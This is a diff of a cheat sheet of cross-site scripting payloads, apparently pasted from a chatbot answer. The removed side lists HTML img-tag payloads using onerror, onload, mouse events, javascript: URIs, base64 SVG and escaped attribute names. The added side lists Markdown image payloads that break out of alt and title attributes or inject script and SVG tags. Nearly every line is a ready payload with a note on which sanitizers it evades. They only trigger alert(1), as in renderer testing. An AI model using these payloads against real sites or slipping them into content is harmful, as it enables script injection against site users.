@@ -1,61 +1,56 @@
-1. Onload JavaScript Trigger (works if image is valid but slow or broken)
+1. Classic JavaScript in title
 markdown
 Copy
 Edit
-<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==" onload=alert(1)>
-This is a valid 1x1 GIF – triggers onload reliably.
+![alt](x "onerror=alert(1)")
+✅ 2. Inject Handler via Alt
+markdown
+Copy
+Edit
+![\" onerror=alert(1) src=x](x)
+Escaped quote in alt allows attribute breakage in HTML output.
 
-2. onmouseover Trigger via Inline Display
+✅ 3. Use Backtick Code Escapes
 markdown
 Copy
 Edit
-<img src=x style="display:inline" onmouseover=alert(1)>
-Hover-triggered XSS; user moves mouse over the image.
+![x`](x "onerror=alert(1)")
+Some renderers mishandle backticks in image alt.
 
-3. SVG Polyglot as Image
+✅ 4. Script Tag in Alt Text
 markdown
 Copy
 Edit
-<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+" onload=1>
-Base64-encoded SVG with onload. Try on modern Markdown renderers.
+![<script>alert(1)</script>](x)
+If alt text is directly injected into HTML, this may execute.
 
-4. XSS with JavaScript URI in src (bypasses some sanitizers)
+✅ 5. Inline Event Clobbering
 markdown
 Copy
 Edit
-<img src="javascript:alert(1)" onerror=alert(1)>
-Not all renderers sanitize javascript: in src.
+![alt](x '"><img src=x onerror=alert(1)>')
+This abuses malformed attribute contexts in certain Markdown parsers.
 
-5. Broken Source + Focus-Based Payload
+✅ 6. Data URI Inside Image Source
 markdown
 Copy
 Edit
-<img src="x" onerror="this.onerror=null;this.src='x';alert(1)">
-Reentrant onerror handler to evade naive blacklist.
+![alt](data:image/svg+xml,<svg onload=alert(1)>) 
+Or encoded:
 
-6. Obfuscated Attribute
 markdown
 Copy
 Edit
-<img src=x o\u006eer\u0072or=alert(1)>
-Unicode escaped attribute name.
-
-7. CSS Injection Style Variant
+![alt](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+)
+🧪 Experimental Clobber/Break Variants
+Break alt context and inject attribute
 markdown
 Copy
 Edit
-<img src=x style="background:url(javascript:alert(1))" onerror=1>
-Works if style is respected and CSS is evaluated inline.
-
-8. Event Handler Chain (if chained handlers are allowed)
+![x" onerror=alert(1)](x)
+Inject invalid tag via alt
 markdown
 Copy
 Edit
-<img src=x onerror="alert('1')" onclick="alert('2')" onmouseover="alert('3')">
-Lets you trigger multiple event paths.
-
-9. Mousemove for Silent Trigger
-markdown
-Copy
-Edit
-<img src=x style="width:100px;height:100px" onmousemove=alert(1)>
+![</title><script>alert(1)</script>](x)
+If alt text is placed into <title> or <h1>, this can break tag context.
